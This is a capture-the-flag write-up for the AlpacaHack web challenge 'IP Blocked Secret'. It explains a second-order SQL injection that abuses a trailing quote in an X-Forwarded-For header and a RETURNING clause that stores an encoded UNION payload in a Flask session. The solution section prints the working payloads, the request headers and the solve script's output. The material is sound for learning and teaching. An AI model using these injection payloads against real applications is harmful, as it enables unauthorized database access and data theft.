# [web] IP Blocked Secret

> A 3-wildcard IP injection looks hopeless — until a trailing quote turns the *secret* field into raw SQL, and `RETURNING char(...) AS id` smuggles an unbounded second-order UNION into the signed session.

## Overview

| Item | Value |
|------|-------|
| Platform | AlpacaHack |
| Event | Daily Challenge |
| Category | web (SQL injection, second-order) |
| Difficulty | ★★★★☆ |
| Date | 2026-11-03 |
| Flag | `Alpaca{ke3p_the_Secret_t0_yours3lf}` |

## Problem Statement

> The secret is safer than ever!
>
> `ip-blocked-secret.tar.gz`

## TL;DR

- `/set`: `INSERT INTO secrets (ip, secret) VALUES ('{ip}', '{secret}') ON CONFLICT(ip) DO UPDATE SET secret = excluded.secret RETURNING id`. `ip` (X-Forwarded-For) is only regex-checked `\d{,3}.\d{,3}.\d{,3}.\d{,3}` → at most 3 arbitrary chars; `secret` doubles `'`.
- A **trailing `'` in `ip`** pairs with the `secret` field's opening quote, so the entire (unlimited-length) `secret` becomes **raw SQL** (encode any quotes with `char()`). Terminate with `/*` — the template is multi-line, so `--` leaves later lines and re-breaks the query.
- Make `RETURNING` return a **string** via `char(...) AS id`; it is stored into the **signed** session `sid`. The index runs `SELECT secret, ip FROM secrets WHERE id='{sid}'` with no length limit on `sid` → a **second-order UNION**. The UNION supplies `ip='1.3.3.7'`; sending that as the GET header passes the `ip == data["ip"]` check and renders the flag.

## Background Knowledge

### Two false assumptions that make it look impossible

1. *"`secret` can't break out"* — true for its own quotes, but `ip`'s trailing `'` consumes `secret`'s opening quote, so `secret`'s body is executed as SQL.
2. *"`sid` is always an int / unforgeable"* — the Flask cookie is signed (can't forge), **but the server itself writes `sid = RETURNING id`**. Make that return an attacker string and the server signs it for you. The 15-char IPv4 regex limits only the header, never the stored `sid`.

### Why `/*` not `--`

The INSERT spans multiple lines. `--` comments only to end-of-line, leaving `') ON CONFLICT ... RETURNING id` lines that re-break the statement (→ no RETURNING → `fetchone()` None → 500 → no commit). `/*` with no `*/` comments across newlines to end of input.

## Solution

**Stage 1 — POST `/set`**, header `X-Forwarded-For: 1.1.1'`, form `secret =`:
```
||0,0)ON CONFLICT(ip)DO UPDATE SET secret=excluded.secret RETURNING char(39,32,85,78,73,79,78,32,83,69,76,69,67,84,32,102,108,97,103,44,32,39,49,46,51,46,51,46,55,39,32,70,82,79,77,32,102,108,97,103,45,45)AS id/*
```
`char(...)` decodes to `' UNION SELECT flag, '1.3.3.7' FROM flag--`, which becomes the signed `sid`.

**Stage 2 — GET `/`** with that session cookie and header `X-Forwarded-For: 1.3.3.7`:
```
SELECT secret, ip FROM secrets WHERE id='' UNION SELECT flag, '1.3.3.7' FROM flag--'
```
→ `secret = <flag>`, `ip = 1.3.3.7` matches the header → flag shown.

See [`solve.py`](solve.py). Verified locally (sqlite + seeded flag) before the remote run.

```bash
$ python3 solve.py http://34.170.146.252:8914
Alpaca{ke3p_the_Secret_t0_yours3lf}
```

## Tools Used

| Tool | Purpose |
|------|---------|
| Python stdlib `http.client` | Two-stage request chain, session reuse |
| sqlite3 + Flask (venv) | Local statement/parse verification |
| `ctf-auditor` (harness) | Stall audit that surfaced the `secret`-breakout + `RETURNING char() AS id` chain |

## Lessons Learned

- A tiny injection surface (3 chars) can still be devastating via **second-order**: control what a later trusted sink (`RETURNING id` → session) stores.
- The field that *looks* safe (quote-escaped `secret`) becomes raw SQL once an adjacent field closes its quote. Always reason about the whole statement, not one field.
- Multi-line SQL defeats `--`; use `/*`.

## References

- [sota70 writeup gist](https://gist.github.com/sota70/3a663991f2a53cdbc96b6bd88262d47a)

## Tags

`web` `sqli` `second-order` `sqlite` `returning` `union` `flask-session` `x-forwarded-for`
